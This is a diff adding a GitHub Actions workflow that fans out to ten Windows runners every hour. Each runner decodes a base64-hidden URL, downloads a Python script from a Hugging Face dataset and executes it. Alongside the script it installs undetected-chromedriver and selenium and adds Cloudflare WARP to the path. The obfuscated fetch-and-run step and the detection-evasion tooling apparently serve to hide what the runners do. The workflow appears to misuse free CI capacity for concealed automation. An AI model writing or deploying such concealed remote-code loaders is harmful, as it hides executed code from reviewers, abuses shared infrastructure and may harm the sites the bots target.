@@ -1,0 +1,70 @@
+name: Automated Workload Pipeline
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: runner-group-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  execute-nodes:
+    name: "Worker-${{ matrix.node_index }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Initialize Environment & Fetch Payload
+        shell: bash
+        run: |
+          echo "==> [INIT] Preparing Worker-${{ matrix.node_index }}..."
+          
+          # فك التشفير للرابط الجديد وتحميل الملف
+          PAYLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmV3ZS9yZXNvbHZlL21haW4vc3RhcnRfc2hyaW5rX25ldy5weQ==" | base64 --decode)
+          
+          curl -sL "$PAYLOAD_URL" -o runner.py
+          
+          echo "==> [INIT] Setting up Python dependencies..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "==> [INIT] Environment is ready."
+
+      - name: Execute Script & Monitor Runtime
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output "[START] Launching runner.py on Instance ${{ matrix.node_index }}..."
+          
+          $env:PATH = $env:PATH + ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $RunOptions = @{
+              FilePath = "python"
+              ArgumentList = "runner.py"
+              PassThru = $true
+              NoNewWindow = $true
+          }
+          $TargetProcess = Start-Process @RunOptions
+          
+          Write-Output "[GUARD] Execution monitor active. Max duration: 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $TargetProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output "[OK] Execution finished successfully."
+          } 
+          catch {
+              Write-Output "[WARN] Time limit of 74 mins exceeded. Terminating process..."
+              Stop-Process -InputObject $TargetProcess -Force
+              Write-Output "[STOPPED] Process was forcefully halted by the monitor."
+          }
+
+      - name: Clean Up & Exit
+        shell: bash
+        run: echo "==> [DONE] Worker-${{ matrix.node_index }} execution cycle completed."
